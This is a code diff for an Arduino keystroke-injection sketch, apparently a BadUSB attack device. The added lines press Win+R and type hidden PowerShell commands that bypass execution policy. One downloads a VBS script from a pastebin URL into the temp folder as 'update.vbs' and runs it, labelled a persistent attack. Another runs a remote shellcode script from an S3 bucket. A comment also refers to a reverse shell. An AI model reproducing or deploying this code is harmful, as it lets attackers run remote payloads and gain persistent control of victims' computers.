@@ -18,26 +18,43 @@ void setup()
   Keyboard.begin();
 
   // Wait 500ms
-  delay(500);
-
+  
   delay(3000);
-  //
-  //  Keyboard.press(KEY_LEFT_GUI);
-  //  Keyboard.press('r');
-  //  Keyboard.releaseAll();
-  //
-  //  delay(1000);
+  //First Payload
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
 
-  //Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');");
+  delay(100);
+  //// Deadly(Maut)_Persistent_ps_Attack
+  Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs");
   delay(100);
   typeKey(KEY_RETURN);
+
   //Control D (desktop)
   delay(400);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');
   Keyboard.releaseAll();
+  
+  //Second Payload in next 10 Seconds
+  delay(10000);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(200);
+  Keyboard.releaseAll();
+  delay(100);
 
-  delay(1000);
+  ////Direct Powershell Listener (One Liner).
+  Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');\"");  
+  delay(100);
+  typeKey(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(400);
+
 
   //  //nishan reverse shell
   //  Keyboard.press(KEY_LEFT_GUI);
@@ -57,20 +74,6 @@ void setup()
   //  Keyboard.press('d');
   //  Keyboard.releaseAll();
   //---------------------------------------------------------------------------------------------------------------------------------------------
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-  delay(400);
-
-
-  Keyboard.print("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs");
-
-  delay
-  (100);
-  typeKey(KEY_RETURN);
-
-
-
   // Ending stream
   Keyboard.end();
 }
